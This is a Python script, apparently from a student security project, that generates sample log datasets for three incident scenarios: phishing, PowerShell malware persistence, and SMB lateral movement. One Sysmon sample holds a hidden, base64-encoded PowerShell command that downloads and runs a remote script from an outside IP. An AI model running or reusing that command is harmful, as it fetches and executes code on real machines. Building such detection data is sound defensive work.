# -*- coding: utf-8 -*-
"""
scripts/generate_datasets.py
Tạo 3 bộ dataset log mẫu cho 3 kịch bản sự cố trọng tâm của đề tài.
"""

import os
import json

def generate_datasets():
    output_dir = os.path.join(os.path.dirname(__file__), "..", "data", "raw")
    os.makedirs(output_dir, exist_ok=True)

    # 1. Kịch bản 1: Phishing Credential Access
    scen1 = {
        "scenario_id": "SCENARIO-01-PHISHING",
        "title": "Phishing Email dẫn đến Credential Harvesting & Initial Access",
        "logs": [
            {
                "log_source": "MailGateway",
                "raw_payload": json.dumps({
                    "event_time": "2026-10-15T08:14:22Z",
                    "sender": "admin-security-alert@micros0ft-support.com",
                    "recipient": "hoainam@hcmute.edu.vn",
                    "subject": "Cảnh báo khẩn cấp: Xác minh tài khoản Office 365",
                    "attachment": "Security_Patch.pdf",
                    "extracted_url": "http://login-microsoft365-verify.com/login.php",
                    "action_taken": "DELIVERED"
                })
            },
            {
                "log_source": "WindowsSecurity",
                "raw_payload": json.dumps({
                    "EventID": 4624,
                    "TimeGenerated": "2026-10-15T08:22:15Z",
                    "TargetUserName": "hoainam",
                    "TargetDomainName": "HCMUTE",
                    "LogonType": 3,
                    "IpAddress": "185.220.101.5",
                    "IpPort": 49812,
                    "WorkstationName": "UNKNOWN",
                    "AuthenticationPackage": "NTLM"
                })
            }
        ]
    }

    # 2. Kịch bản 2: Endpoint Malware Execution & Persistence
    scen2 = {
        "scenario_id": "SCENARIO-02-MALWARE",
        "title": "Endpoint Malware Execution & Persistence qua PowerShell",
        "logs": [
            {
                "log_source": "Sysmon",
                "raw_payload": json.dumps({
                    "EventID": 1,
                    "UtcTime": "2026-10-15T09:30:10Z",
                    "ProcessId": "4812",
                    "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "CommandLine": r"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAyADYALgAyADkALgAxADEAMgAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
                    "ParentProcessId": "3104",
                    "ParentImage": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                    "User": r"HCMUTE\truongdo",
                    "Hashes": "SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91"
                })
            },
            {
                "log_source": "Sysmon",
                "raw_payload": json.dumps({
                    "EventID": 3,
                    "UtcTime": "2026-10-15T09:30:15Z",
                    "ProcessId": "4812",
                    "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "Protocol": "tcp",
                    "SourceIp": "192.168.1.105",
                    "SourcePort": 52140,
                    "DestinationIp": "194.26.29.112",
                    "DestinationPort": 443,
                    "User": r"HCMUTE\truongdo"
                })
            },
            {
                "log_source": "Sysmon",
                "raw_payload": json.dumps({
                    "EventID": 11,
                    "UtcTime": "2026-10-15T09:30:20Z",
                    "ProcessId": "4812",
                    "TargetFilename": r"C:\Users\Public\update_agent.exe",
                    "CreationUtcTime": "2026-10-15T09:30:20Z"
                })
            },
            {
                "log_source": "WindowsSecurity",
                "raw_payload": json.dumps({
                    "EventID": 7045,
                    "TimeGenerated": "2026-10-15T09:30:25Z",
                    "ServiceName": "WindowsTelemetryUpdater",
                    "ImagePath": r"C:\Users\Public\update_agent.exe",
                    "ServiceType": "user mode service",
                    "StartType": "auto start",
                    "AccountName": "LocalSystem"
                })
            }
        ]
    }

    # 3. Kịch bản 3: Network Reconnaissance & Lateral Movement
    scen3 = {
        "scenario_id": "SCENARIO-03-LATERAL",
        "title": "Network Reconnaissance & Lateral Movement qua SMB",
        "logs": [
            {
                "log_source": "Zeek",
                "raw_payload": json.dumps({
                    "ts": 1760521200.0,
                    "uid": "Cxyz12345",
                    "id.orig_h": "192.168.1.105",
                    "id.orig_p": 41230,
                    "id.resp_h": "192.168.1.200",
                    "id.resp_p": 445,
                    "proto": "tcp",
                    "conn_state": "S0",
                    "history": "S",
                    "orig_bytes": 0,
                    "resp_bytes": 0
                })
            },
            {
                "log_source": "WindowsSecurity",
                "raw_payload": json.dumps({
                    "EventID": 4624,
                    "TimeGenerated": "2026-10-15T10:05:00Z",
                    "TargetUserName": "Administrator",
                    "TargetDomainName": "HCMUTE",
                    "LogonType": 3,
                    "IpAddress": "192.168.1.105",
                    "IpPort": 51044,
                    "WorkstationName": "PC-FINANCE-01",
                    "ElevatedToken": "Yes"
                })
            }
        ]
    }

    datasets = [
        ("scenario_1_phishing.json", scen1),
        ("scenario_2_malware.json", scen2),
        ("scenario_3_lateral.json", scen3),
    ]

    for fname, data in datasets:
        fpath = os.path.join(output_dir, fname)
        with open(fpath, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        print(f"Dataset generated: {fpath}")

if __name__ == "__main__":
    generate_datasets()
